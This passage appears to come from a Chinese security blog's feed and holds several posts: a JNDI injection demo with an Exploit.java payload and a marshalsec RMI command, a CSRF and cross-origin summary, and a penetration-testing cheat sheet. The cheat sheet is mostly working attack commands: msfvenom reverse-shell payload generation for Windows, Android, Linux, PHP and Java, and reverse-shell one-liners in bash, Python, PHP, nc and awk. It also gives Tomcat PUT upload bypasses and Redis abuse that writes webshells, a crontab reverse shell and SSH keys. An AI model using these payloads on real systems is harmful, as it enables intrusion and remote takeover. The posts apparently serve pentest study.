class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx.lookup(&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;Exploit&quot;);</span><br></pre></td></tr></table></figure><p>Exploit.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>:</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: Pxy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2020-03-22 16:37</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">"calc.exe"</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译好之后，放到一个web目录下</p><p><img src= "/img/loading.gif" data-src="/posts/fe658142/1584867473029.png" alt></p><p>然后开启RMI服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.exe -cp .\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http:&#x2F;&#x2F;127.0.0.1:8002&#x2F;#Exploit 1099</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/fe658142/1584867499037.png" alt></p><p>运行即可弹出计算器</p><p><img src= "/img/loading.gif" data-src="/posts/fe658142/1584867538545.png" alt></p><p><img src= "/img/loading.gif" data-src="/posts/fe658142/1584867555946.png" alt></p><blockquote><p>在调试的时候遇到了一个问题，java版本不兼容，由于我电脑上存在java7和java8，会报错</p><p><img src= "/img/loading.gif" data-src="/posts/fe658142/1584867717633.png" alt></p><p><a href="https://stackoverflow.com/questions/22489398/unsupported-major-minor-version-52-0" target="_blank" rel="noopener">https://stackoverflow.com/questions/22489398/unsupported-major-minor-version-52-0</a></p></blockquote><h2 id="spring-JNDI注入"><a href="#spring-JNDI注入" class="headerlink" title="spring JNDI注入"></a>spring JNDI注入</h2><p>利用链：</p><p><code>JtaTransactionManager</code></p><p><img src= "/img/loading.gif" data-src="/posts/fe658142/1584868292042.png" alt></p><p>跟进 <code>initUserTransactionAndTransactionManager</code></p><p><img src= "/img/loading.gif" data-src="/posts/fe658142/1584874126510.png" alt></p><p>继续跟进 <code>lookupUserTransaction</code> 方法</p><p><img src= "/img/loading.gif" data-src="/posts/fe658142/1584874158465.png" alt></p><p>可以看到调用了lookup,而且我们可以看到整个调用链只要我们可控<code>userTransactionName</code>就可以,</p><p><img src= "/img/loading.gif" data-src="/posts/fe658142/1584874198634.png" alt></p><p>调用链比较简单，最后控制属性即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">org.springframework.transaction.jta.JtaTransactionManager object = <span class="keyword">new</span> org.springframework.transaction.jta.JtaTransactionManager();</span><br><span class="line">object.setUserTransactionName(jndiAddress);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jndi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF相关总结</title>
      <link href="/posts/f70b79f3/"/>
      <url>/posts/f70b79f3/</url>
      
        <content type="html"><![CDATA[<p>刚开始想写这篇文章的时候有点纠结分类，感觉归类到CTF不是很好，因为在CTF中就没遇到过，归类到渗透测试呢，又感觉不太对23333，算了还是丢到渗透测试吧</p><h2 id="同源策略-SOP"><a href="#同源策略-SOP" class="headerlink" title="同源策略(SOP)"></a>同源策略(SOP)</h2><p>SOP影响范围包括：普通的HTTP请求、XMLHttpRequest、XSLT、XBL。</p><p>同源是指，<strong>域名，协议，端口相同</strong></p><p>跨域的种类</p><ul><li>协议不同</li><li>端口不同</li><li>主域名不同</li><li>子域名不同</li></ul><p>允许跨域的标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;...&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;...&quot;&gt;</span><br><span class="line">&lt;video src&#x3D;&quot;...&quot;&gt;&lt;&#x2F;video&gt;</span><br><span class="line">&lt;audio src&#x3D;&quot;...&quot;&gt;&lt;&#x2F;audio&gt;</span><br><span class="line">&lt;embed src&#x3D;&quot;...&quot;&gt;</span><br><span class="line">&lt;frame src&#x3D;&quot;...&quot;&gt;</span><br><span class="line">&lt;iframe src&#x3D;&quot;...&quot;&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;...&quot;&gt;</span><br><span class="line">&lt;applet code&#x3D;&quot;...&quot;&gt;&lt;&#x2F;applet&gt;</span><br><span class="line">&lt;object data&#x3D;&quot;...&quot; &gt;&lt;&#x2F;object&gt;</span><br></pre></td></tr></table></figure><p>同源策略虽然感觉很陌生，但确实前端的基石，地位类似于在牛顿定律在力学中的地位</p><p>试想没有同源策略的话，那么任何一个网页都可以随意操控其他网页的数据，那真的是web世界的灾难。就像牛顿定律如果失效，估计地球都不知道怎么绕太阳转了</p><p><strong>重点：</strong></p><p><strong>跨域并不是请求发不出去，请求能发出去，服务端能收到请求并正常返回结果，只是结果被浏览器拦截了</strong>。你可能会疑问明明通过表单的方式可以发起跨域请求，为什么 Ajax 就不会?因为归根结底，跨域是为了阻止用户读取到另一个域名下的内容，Ajax 可以获取响应，浏览器认为这不安全，所以拦截了响应。但是表单并不会获取新的内容，所以可以发起跨域请求。同时也说明了跨域并不能完全阻止 CSRF，因为请求毕竟是发出去了。</p><h2 id="如何跨域？"><a href="#如何跨域？" class="headerlink" title="如何跨域？"></a>如何跨域？</h2><p>跨域是必须的，因为同源策略的限制太严格了，子域名居然也和域名不同源！</p><ol><li>设置window.domain</li></ol><p>浏览器允许通过设置 <code>document.domain</code> 来共享cookie</p><ol start="2"><li>cookie本身的domain属性</li></ol><p>cookie本身可以设置 <code>domain</code> 属性，指定Cookie的所属域名为一级域名，比如<code>.example.com</code>。那么二级和三级域名也可以读取到cookie    </p><h3 id="jsonp跨域"><a href="#jsonp跨域" class="headerlink" title="jsonp跨域"></a>jsonp跨域</h3><p>声明一个回调函数，其函数名(如show)当做参数值，要传递给跨域请求数据的服务器，函数形参为要获取目标数据(服务器返回的data)。</p><p>创建一个<code>&lt;script&gt;</code>标签，把那个跨域的API数据接口地址，赋值给script的src,还要在这个地址中向服务器传递该函数名（可以通过问号传参:?callback=show）。</p><p>服务器接收到请求后，需要进行特殊的处理：把传递进来的函数名和它需要给你的数据拼接成一个字符串,例如：传递进去的函数名是show，它准备好的数据是<code>show(&#39;我不爱你&#39;)</code>。</p><p>最后服务器把准备的数据通过HTTP协议返回给客户端，客户端再调用执行之前声明的回调函数（show），对返回的数据进行操作。</p><p>一个典型的jsonp攻击的代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wooyun</span>(<span class="params">v</span>)</span>&#123;</span><br><span class="line">    alert(v.username);</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script src="http:/</span><span class="regexp">/js.login.360.cn/</span>?o=sso&amp;m=info&amp;func=wooyun<span class="string">"&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>发送请求过去之后，服务端返回了数据，然后就被弹出来了</p><p>遇到过的一个CTF题目</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&#x2F;src&#x3D;&amp;unit&#x3D;https:&#x2F;&#x2F;www.google.com&#x2F;complete&#x2F;search?client&#x3D;chrome&amp;q&#x3D;hello&amp;callback&#x3D;alert&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h4 id="防御jsonp攻击"><a href="#防御jsonp攻击" class="headerlink" title="防御jsonp攻击"></a>防御jsonp攻击</h4><p>验证 JSON 文件调用的来源（ Referer ）。这个方案是主要利用了 <code>&lt;script&gt;</code> 远程加载 JSON 文件时会发送 Referer ，在网站输出 JSON 数据时判断 Referer 是不是白名单合法的就可以进行防御！这个方法是可行的</p><ol><li>正则过滤不严谨</li><li>空referer</li></ol><h3 id="CORS-跨域资源共享"><a href="#CORS-跨域资源共享" class="headerlink" title="CORS 跨域资源共享"></a>CORS 跨域资源共享</h3><p>允许浏览器向跨源服务器，发出<a href="http://www.ruanyifeng.com/blog/2012/09/xmlhttprequest_level_2.html" target="_blank" rel="noopener"><code>XMLHttpRequest</code></a>请求，从而克服了AJAX只能<a href="http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html" target="_blank" rel="noopener">同源</a>使用的限制。</p><p>区分简单请求和非简单请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">（1) 请求方法是以下三种方法之一：</span><br><span class="line"></span><br><span class="line">HEAD</span><br><span class="line">GET</span><br><span class="line">POST</span><br><span class="line">（2）HTTP的头信息不超出以下几种字段：</span><br><span class="line"></span><br><span class="line">Accept</span><br><span class="line">Accept-Language</span><br><span class="line">Content-Language</span><br><span class="line">Last-Event-ID</span><br><span class="line">Content-Type：只限于三个值application&#x2F;x-www-form-urlencoded、multipart&#x2F;form-data、text&#x2F;plain</span><br></pre></td></tr></table></figure><p>满足以上要求即是简单请求</p><p>重点在最后一句： </p><blockquote><p>Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain</p></blockquote><p>对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个<code>Origin</code>字段。这个字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。</p><p>如果<code>Origin</code>指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;api.bob.com</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">Access-Control-Expose-Headers: FooBar</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br></pre></td></tr></table></figure><p>Access-Control-Allow-Origin： 要么是 origin 的值，要么就是 *</p><p>Access-Control-Allow-Credentials: 它的值是一个布尔值，表示是否允许发送Cookie。如果不要的话就删除这个字段</p><p>Access-Control-Expose-Headers：如果想拿到其他字段，就必须在<code>Access-Control-Expose-Headers</code>里面指定。</p><p>CORS请求默认不发送Cookie和HTTP认证信息。如果要把Cookie发到服务器，一方面要服务器同意，指定<code>Access-Control-Allow-Credentials</code>字段。</p><h2 id="cookie属性"><a href="#cookie属性" class="headerlink" title="cookie属性"></a>cookie属性</h2><p>cookie的五大属性:“path, domain, expire, HttpOnly, Secure”，很少有人了解到cookie还有一个SameSite属性，这是一个专门用于防止csrf漏洞的属性。</p><ol><li>http-only:</li></ol><p>浏览器会禁止页面中的 JavaScript 访问带有 HttpOnly 属性的 Cookie</p><ol start="2"><li>domain</li></ol><p>domain标识域，如域A为t1.test.com，域B为t2.test.com，那么在域A生产一个令域A和域B都能访问的cookie就要将该cookie的domain设置为.test.com</p><ol start="3"><li>expire</li></ol><p>过期时间</p><ol start="4"><li>Secure</li></ol><p>当设置为true时，表示创建的 Cookie 会被以安全的形式向服务器传输，也就是只能在 HTTPS 连接中被浏览器传递到服务器端进行会话验证，如果是 HTTP 连接则不会传递该信息，所以不会被窃取到Cookie 的具体内容。</p><ol start="5"><li>path</li></ol><p>path表示cookie所在的目录</p><h3 id="cookie分类"><a href="#cookie分类" class="headerlink" title="cookie分类"></a>cookie分类</h3><h2 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h2><h3 id="samsite属性"><a href="#samsite属性" class="headerlink" title="samsite属性"></a>samsite属性</h3><p>面试真实问题：vue开发的前后端项目如何避免CSRF？</p><p>查到的解决方案：</p><ol><li>如果后端用Django开发，可以通过传递CSRF token过来</li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透常见知识</title>
      <link href="/posts/6941c9ee/"/>
      <url>/posts/6941c9ee/</url>
      
        <content type="html"><![CDATA[<h2 id="msf常用命令"><a href="#msf常用命令" class="headerlink" title="msf常用命令"></a>msf常用命令</h2><h3 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h3><p>参数：</p><ul><li><p><code>-l</code> 列出相关的值，这些值包括 <code>payloads, encoders, nops, platforms, archs, encrypt, formats, all</code></p></li><li><p><code>-b</code> badchar 参数被设置的时候，它的值中描述的字符将会被避免出现在 Payload 中</p></li><li><p><code>-e</code> 开启payload编码</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l encoders 列出所有的编码器</span><br></pre></td></tr></table></figure><p>其中比较强大的有：</p><p><code>x86/shikata_ga_nai, cmd/powershell_base64</code></p><ul><li><code>-i</code> 指定编码次数</li><li><code>-x</code> 指定一个特定的可执行文件作为模板，常与 <code>-k</code> 联合使用，保护模板程序的功能，注入的payload作为一个新的进程运行</li><li><code>-n</code> 指定填充的nop数量</li></ul><h3 id="常用payload生成命令"><a href="#常用payload生成命令" class="headerlink" title="常用payload生成命令"></a>常用payload生成命令</h3><p>Windows (避免坏字节的出现)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">LHOST&#x3D;攻击机IP LPORT&#x3D;攻击机端口 -e x86&#x2F;shikata_ga_nai -b &#39;\x00\x0a\xff&#39; -i 3 -f exe -o payload.exe</span><br></pre></td></tr></table></figure><p>Android</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;需要签名</span><br><span class="line">msfvenom -a x86 --platform Android -p android&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;攻击机IP LPORT&#x3D;攻击机端口 -f apk -o payload.apk</span><br></pre></td></tr></table></figure><p>powershell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows&#x2F;powershell_reverse_tcp LHOST&#x3D;攻击机IP LPORT&#x3D;攻击机端口 -e cmd&#x2F;powershell_base64 -i 3 -f raw -o payload.ps1</span><br></pre></td></tr></table></figure><p>Linux</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Linux -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;攻击机IP LPORT&#x3D;攻击机端口 -f elf -o payload.elf</span><br></pre></td></tr></table></figure><p>php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter_reverse_tcp LHOST&#x3D;攻击机IP LPORT&#x3D;攻击机端口 -f raw &gt; shell.php</span><br></pre></td></tr></table></figure><p>war</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;攻击机IP LPORT&#x3D;攻击机端口 -f raw - o payload.war</span><br></pre></td></tr></table></figure><p>war包和jar包区别：</p><blockquote><p>war包是java web打的包，可以直接丢到tomcat的webapp目录下运行，jar包是java应用程序打的包，像spring boot打包就是jar，因为内置了web服务器</p></blockquote><p>python</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p python&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;攻击机IP LPORT&#x3D;攻击机端口 -f raw -o payload.py</span><br></pre></td></tr></table></figure><p>Windows shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;攻击机IP LPORT&#x3D;攻击机端口 -f c</span><br></pre></td></tr></table></figure><p>Linux shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Linux -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;攻击机IP LPORT&#x3D;攻击机端口 -f c</span><br></pre></td></tr></table></figure><h2 id="常用反弹shell"><a href="#常用反弹shell" class="headerlink" title="常用反弹shell"></a>常用反弹shell</h2><p>github项目：<a href="https://github.com/m0rph-1/revshellgen" target="_blank" rel="noopener">https://github.com/m0rph-1/revshellgen</a> 可以很方便地生成各种形式的反弹shell命令</p><p>bash反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">~&#x2F;revshellgen (master ✔) ᐅ python revshellgen.py -i 127.0.0.1 -p 1234 -t bash</span><br><span class="line"></span><br><span class="line">[+] Reverse shell command:</span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>python反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure><p>php反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;127.0.0.1&quot;,1234);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure><p>nc反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ncat 127.0.0.1 1234 -e &#x2F;bin&#x2F;sh</span><br><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 127.0.0.1 1234 &gt;&#x2F;tmp&#x2F;f</span><br></pre></td></tr></table></figure><p>awk反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#39;BEGIN &#123;s &#x3D; &quot;&#x2F;inet&#x2F;tcp&#x2F;0&#x2F;127.0.0.1&#x2F;1234&quot;; while(42) &#123; do&#123; printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c)&#123; while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); &#125; &#125; while(c !&#x3D; &quot;exit&quot;) close(s); &#125;&#125;&#39; &#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p>nc-pipe</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;bin&#x2F;sh | nc 127.0.0.1 1234</span><br></pre></td></tr></table></figure><h2 id="tomcat常见漏洞"><a href="#tomcat常见漏洞" class="headerlink" title="tomcat常见漏洞"></a>tomcat常见漏洞</h2><h3 id="Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）"><a href="#Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）" class="headerlink" title="Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）"></a>Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</h3><p><code>/conf/web.xml</code> 文件中的readonly为false</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;init-param&gt;</span><br><span class="line">    &lt;param-name&gt;readonly&lt;&#x2F;param-name&gt;</span><br><span class="line">    &lt;param-value&gt;false&lt;&#x2F;param-value&gt;</span><br><span class="line">&lt;&#x2F;init-param&gt;</span><br></pre></td></tr></table></figure><p>之后就可以通过PUT方式上传文件，但是 <code>.jsp</code> 的后缀会被限制</p><p>绕过方式：</p><ul><li>Windows文件名加空格 <code>PUT /x.jsp%20 HTTP/1.1</code> 上传之后在Windows下空格会被去掉</li><li>NTFS流， <code>PUT /x.jsp::$DATA HTTP/1.1</code></li><li><code>/</code>在文件名中是非法的，也会被去除（Linux/Windows) <code>PUT /x.jsp/ HTTP/1.1</code></li></ul><h3 id="tomcat-后台部署war包漏洞"><a href="#tomcat-后台部署war包漏洞" class="headerlink" title="tomcat 后台部署war包漏洞"></a>tomcat 后台部署war包漏洞</h3><p><code>tomcat-users.xml</code> 修改配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;role rolename&#x3D;&quot;manager-gui&quot;&#x2F;&gt;</span><br><span class="line">&lt;role rolename&#x3D;&quot;admin-gui&quot;&#x2F;&gt;</span><br><span class="line">&lt;user username&#x3D;&quot;tomcat&quot; password&#x3D;&quot;admin&quot; roles&#x3D;&quot;manager-gui,admin-gui&quot;&#x2F;&gt;</span><br><span class="line">&lt;user username&#x3D;&quot;both&quot; password&#x3D;&quot;admin&quot; roles&#x3D;&quot;tomcat,role1&quot;&#x2F;&gt;</span><br><span class="line">&lt;user username&#x3D;&quot;role1&quot; password&#x3D;&quot;admin&quot; roles&#x3D;&quot;role1&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure><p>之后访问到 <code>http://127.0.0.1:8080/manager</code></p><p>写一个shell.jsp，打包之后改名为war包上传即可getshell(也可以用msf生成一个war包)</p><h3 id="tomcat目录遍历"><a href="#tomcat目录遍历" class="headerlink" title="tomcat目录遍历"></a>tomcat目录遍历</h3><p><code>web.xml</code> 中如果 <code>listings</code> 参数为true，导致目录遍历漏洞</p><p><img src= "/img/loading.gif" data-src="/posts/6941c9ee/1584495111390.png" alt> </p><h2 id="redis常见漏洞"><a href="#redis常见漏洞" class="headerlink" title="redis常见漏洞"></a>redis常见漏洞</h2><p>给你一个未授权访问redis，你能做啥？</p><h3 id="redis写shell"><a href="#redis写shell" class="headerlink" title="redis写shell"></a>redis写shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">config set dbfilename redis.php</span><br><span class="line">set webshell &quot;&lt;?php phpinfo(); ?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h3 id="写crontab反弹shell"><a href="#写crontab反弹shell" class="headerlink" title="写crontab反弹shell"></a>写crontab反弹shell</h3><p>在redis以root权限运行时可以写crontab来执行命令反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# redis-cli -h 192.168.63.130</span><br><span class="line">192.168.63.130:6379&gt; set x &quot;\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.63.128&#x2F;7999 0&gt;&amp;1\n&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.63.130:6379&gt; config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;</span><br><span class="line">OK</span><br><span class="line">192.168.63.130:6379&gt; config set dbfilename root</span><br><span class="line">OK</span><br><span class="line">192.168.63.130:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><h3 id="写ssh-keygen公钥"><a href="#写ssh-keygen公钥" class="headerlink" title="写ssh-keygen公钥"></a>写ssh-keygen公钥</h3><p>在以下条件下，可以利用此方法</p><ol><li>Redis服务使用ROOT账号启动</li><li>服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</li></ol><p><code>ssh-keygen -t rsa</code> 生成一对公私钥</p><p>然后redis执行命令，注意写入的公钥必须要前后分别加个换行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">192.168.63.130:6379&gt; config set dir &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">OK</span><br><span class="line">192.168.63.130:6379&gt; config set dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">192.168.63.130:6379&gt; set x &quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKfxu58CbSzYFgd4BOjUyNSpbgpkzBHrEwH2&#x2F;XD7rvaLFUzBIsciw9QoMS2ZPCbjO0IZL50Rro1478kguUuvQrv&#x2F;RE&#x2F;eHYgoav&#x2F;k6OeyFtNQE4LYy5lezmOFKviUGgWtUrra407cGLgeorsAykL+lLExfaaG&#x2F;d4TwrIj1sRz4&#x2F;GeiWG6BZ8uQND9G+Vqbx&#x2F;+zi3tRAz2PWBb45UXATQPvglwaNpGXVpI0dxV3j+kiaFyqjHAv541b&#x2F;ElEdiaSadPjuW6iNGCRaTLHsQNToDgu92oAE2MLaEmOWuQz1gi90o6W1WfZfzmS8OJHX&#x2F;GJBXAMgEgJhXRy2eRhSpbxaIVgx root@kali\n\n\n&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.63.130:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><h2 id="phpmyadmin常见漏洞"><a href="#phpmyadmin常见漏洞" class="headerlink" title="phpmyadmin常见漏洞"></a>phpmyadmin常见漏洞</h2><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/256#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/256#toc-2</a></p><p><a href="https://paper.seebug.org/975/" target="_blank" rel="noopener">https://paper.seebug.org/975/</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel POP链讲解</title>
      <link href="/posts/898eeda9/"/>
      <url>/posts/898eeda9/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> POP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入总结</title>
      <link href="/posts/9b13a55/"/>
      <url>/posts/9b13a55/</url>
      
